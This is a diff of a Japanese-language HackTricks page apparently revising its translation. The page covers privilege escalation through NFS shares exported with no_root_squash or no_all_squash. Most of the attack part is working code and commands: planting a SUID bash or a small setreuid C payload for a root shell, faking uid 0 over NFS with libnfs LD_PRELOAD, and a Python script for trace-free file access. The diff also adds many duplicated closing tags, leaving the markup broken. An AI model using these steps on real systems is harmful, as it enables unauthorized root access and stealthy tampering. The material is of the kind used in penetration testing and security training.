@@ -1,31 +1,37 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [Discordグループに参加](https://discord.gg/hRep4RUj7f)**または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **ハッキングトリックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-_ **/etc/exports** _ ファイルを読み取り、**no\_root\_squash** として構成されたディレクトリがある場合、それを**クライアントとしてアクセス**し、そのディレクトリ内に**ローカルのrootであるかのように書き込む**ことができます。
+_ **/etc/exports** _ ファイルを読み、**no\_root\_squash**として設定されているディレクトリが見つかった場合、**クライアントとして**それに**アクセス**し、そのディレクトリの中に**ローカルの**マシンの**root**のように**書き込む**ことができます。
 
-**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにアクセスする権限を与えます。これには深刻なセキュリティ上の問題が発生する可能性があります。
+**no\_root\_squash**: このオプションは基本的に、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これにより、深刻なセキュリティ上の問題が生じる可能性があります。
 
-**no\_all\_squash:** これは**no\_root\_squash** オプションに類似していますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持っているとします。/etc/exportsファイルを確認し、no\_all\_squashオプションが存在することを確認し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成します（nfsを使用してマウント）。 nobodyユーザーとしてsuidを実行し、異なるユーザーになります。
+**no\_all\_squash:** これは**no\_root\_squash**オプションに似ていますが、**非rootユーザー**に適用されます。例えば、nobodyユーザーとしてシェルを持ち、/etc/exportsファイルを確認し、no\_all\_squashオプションが存在し、/etc/passwdファイルを確認し、非rootユーザーをエミュレートし、そのユーザーとしてsuidファイルを作成（nfsを使用してマウント）します。その後、nobodyユーザーとしてsuidを実行し、異なるユーザーになります。
 
-# 特権昇格
+# Privilege Escalation
 
-## リモートエクスプロイト
+## Remote Exploit
 
 この脆弱性を見つけた場合、次のように悪用できます：
 
-* クライアントマシンでそのディレクトリを**マウント**し、マウントされたフォルダ内に **/bin/bash** バイナリを**rootとしてコピー**し、それに **SUID権限**を与え、被害者のマシンからそのbashバイナリを実行します。
+* **そのディレクトリを**クライアントマシンに**マウントし、rootとして**マウントされたフォルダ内に**/bin/bash**バイナリをコピーし、**SUID**権限を与え、**被害者**マシンからそのbashバイナリを実行します。
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **クライアントマシンでそのディレクトリをマウント**し、**ルートとして**マウントされたフォルダーに、SUID権限を悪用するコンパイル済みのペイロードをコピーし、それにSUID権限を与え、**被害者のマシンから**そのバイナリを実行します（ここにいくつかの[C SUID payloads](payloads-to-execute.md#c)があります）。
+* **クライアントマシンでそのディレクトリをマウントし、** マウントされたフォルダ内に **rootとして** SUID権限を悪用するコンパイル済みペイロードをコピーし、それに **SUID** 権限を与え、**被害者** マシンからそのバイナリを **実行** します（ここにいくつかの[C SUIDペイロード](payloads-to-execute.md#c)があります）。
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -52,20 +58,20 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## ローカルエクスプロイト
+## Local Exploit
 
 {% hint style="info" %}
-自分のマシンから被害者のマシンへのトンネルを作成できる場合、引き続き必要なポートをトンネリングすることで、この特権昇格を悪用するリモートバージョンを使用できます。\
-次のトリックは、`/etc/exports` ファイルがIPを示している場合です。この場合、リモートエクスプロイトを使用することはできず、このトリックを悪用する必要があります。\
-エクスプロイトが機能するための別の必須要件は、`/etc/export` 内のエクスポートが `insecure` フラグを使用している必要があることです。\
-\--_もし `/etc/export` がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--
+注意してください、もしあなたが**あなたのマシンから被害者のマシンへのトンネルを作成できるなら、必要なポートをトンネリングしてこの特権昇格を悪用するためにリモートバージョンを使用することができます**。\
+次のトリックは、ファイル`/etc/exports`が**IPを示している場合**です。この場合、**リモートエクスプロイトを使用することはできず**、**このトリックを悪用する必要があります**。\
+エクスプロイトが機能するためのもう一つの必要条件は、**`/etc/export`内のエクスポートが`insecure`フラグを使用していること**です。\
+\--_もし`/etc/export`がIPアドレスを示している場合、このトリックが機能するかどうかはわかりません_--
 {% endhint %}
 
-## 基本情報
+## Basic Information
 
-シナリオでは、ローカルマシン上のマウントされたNFS共有を悪用し、NFSv3仕様の欠陥を利用してクライアントがuid/gidを指定できるようにし、不正アクセスを可能にします。エクスプロイトには、NFS RPC呼び出しの偽造を可能にするライブラリである[libnfs](https://github.com/sahlberg/libnfs)を使用します。
+このシナリオは、ローカルマシン上のマウントされたNFS共有を悪用し、クライアントが自分のuid/gidを指定できるNFSv3仕様の欠陥を利用して、無許可のアクセスを可能にします。悪用には、NFS RPCコールの偽造を可能にするライブラリ[libnfs](https://github.com/sahlberg/libnfs)を使用します。
 
-### ライブラリのコンパイル
+### Compiling the Library
 
 ライブラリのコンパイル手順は、カーネルバージョンに基づいて調整が必要な場合があります。この特定のケースでは、fallocateシステムコールがコメントアウトされていました。コンパイルプロセスには、次のコマンドが含まれます：
 ```bash
@@ -76,7 +82,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### 攻撃の実行
 
-攻撃には、特権をrootに昇格させ、シェルを実行する単純なCプログラム（`pwn.c`）を作成することが含まれます。プログラムをコンパイルし、生成されたバイナリ（`a.out`）を、RPC呼び出しでuidを偽装するためにsuid rootで共有に配置します。
+この攻撃は、特権をルートに昇格させ、シェルを実行するシンプルなCプログラム（`pwn.c`）を作成することを含みます。プログラムはコンパイルされ、結果として得られたバイナリ（`a.out`）は、RPC呼び出しでuidを偽装するために`ld_nfs.so`を使用して、suid rootで共有に配置されます。
 
 1. **攻撃コードをコンパイルする:**
 ```bash
@@ -85,7 +91,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **攻撃を共有に配置し、uidを偽装してアクセス権を変更する:**
+2. **攻撃を共有に配置し、uidを偽装してその権限を変更する:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -93,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **root権限を取得するために攻撃を実行する:**
+3. **攻撃を実行してルート権限を取得する:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## ボーナス: ステルスファイルアクセスのためのNFShell
-rootアクセスを取得した後、所有権を変更せずにNFS共有とやり取りするために（痕跡を残さないように）、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidを調整し、許可の問題なく共有内のファイルとやり取りできるようにします。
+## ボーナス: NFShellによるステルスファイルアクセス
+ルートアクセスを取得した後、所有権を変更せずにNFS共有と対話するために（痕跡を残さないために）、Pythonスクリプト（nfsh.py）が使用されます。このスクリプトは、アクセスされるファイルのuidに一致するようにuidを調整し、権限の問題なしに共有上のファイルと対話できるようにします:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -119,25 +125,32 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-実行方法:
+実行するには：
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## 参考文献
-* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)
-
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
